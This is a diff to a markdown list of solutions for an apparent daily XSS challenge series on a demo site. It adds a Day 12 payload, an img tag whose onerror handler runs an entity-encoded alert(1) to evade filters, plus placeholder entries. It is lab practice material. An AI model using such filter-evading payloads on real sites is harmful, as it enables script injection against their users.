@@ -14,7 +14,7 @@ Helpful resources and tools:
 
 ---
 
-These are some solutions I was able to find, I am sure there are many more.
+These are some solutions I was able to find, I am sure there are many more. Tested with Firefox Version 95.0 (64-bit) on Windows.
 
 **+++ Day 1 +++**  
 https://xmass.compass-demo.com/level1
@@ -76,6 +76,16 @@ https://xmass.compass-demo.com/level10
 ```
 **+++ Day 11 +++**  
 https://xmass.compass-demo.com/level11
+```
+tbc
+```
+**+++ Day 12 +++**  
+https://xmass.compass-demo.com/level12
+```
+<img src="x" onerror="&#97&#108&#101&#114&#116&#40&#49&#41">
+```
+**+++ Day 13 +++**  
+https://xmass.compass-demo.com/level13
 ```
 tbc
 ```
